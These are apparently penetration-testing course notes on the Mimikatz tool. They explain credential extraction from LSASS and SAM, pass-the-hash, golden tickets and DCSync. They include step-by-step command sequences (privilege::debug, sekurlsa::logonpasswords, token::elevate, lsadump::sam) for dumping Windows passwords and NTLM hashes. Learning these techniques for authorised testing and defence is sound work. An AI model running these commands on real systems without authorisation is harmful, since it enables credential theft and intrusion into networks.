# Mimikatz
The de factor blackhat/whitehat credential manipulation tool.
Post exploitation tool to retrieve/handle credentials in various formats.
https://adsecurity.org/?page_id=1821 (unofficial guide)

## Basics
- reads from LSASS memory to retrieve AD credentials
    - Cleartext passwords (depends on Windows version and GPO settings)
    - NTLM hashes ("pass-the-hash" and "pass-the-ticket")
    - Kerberos (build custom (golden) tickets)
- reads from SAM process to retrieve local credentials (same/similar to LSASS)
- needs to be run as admin (or better needs the debug "SeDebugPrivilege" priviledge) and elevated high (UAC)

*Remark: we could also get a memory dump via Task Manager !!!(without Mimikatz)*

**Extract credentials (SAM + LKSASS)**
-> see pdf "05F Credential Abuse.pdf"

**DCSync**
Replicating directly from domain controller. Simulate a DC asking another DC to replicate one or more object incl. credentials
Requires specific privileges.

**Other**
- impersonating tokens
- -> see pdf "05F Credential Abuse.pdf"

## Dump Logon passwords from Lsass.exe 

1. `.\mimikatz.exe`  -> start mimikatz prompt
2. `privilege::debug` -> aquire debug privilege to spy into other processes (which we have to be admin)
    - expected response: "Privilege '20' OK"
3. `log my_log.txt` -> enable logging (highly recommended)
4. `sekurlsa::logonpasswords` ->  retrieve our credentials
    - Check the output for NTLM hash


## Dump local passward from SAM
1. If mimikatz is not started yet: `.\mimikatz.exe` 
2. `token::elevate` -> elevate our permissions to SYSTEM  (see UAC levels, needed for SAM)
3. if not done before: `log my_log.txt` -> enable logging (highly recommended)
3. `lsadump::sam` -> will dump content SAM
    - Check the output for NTLM hash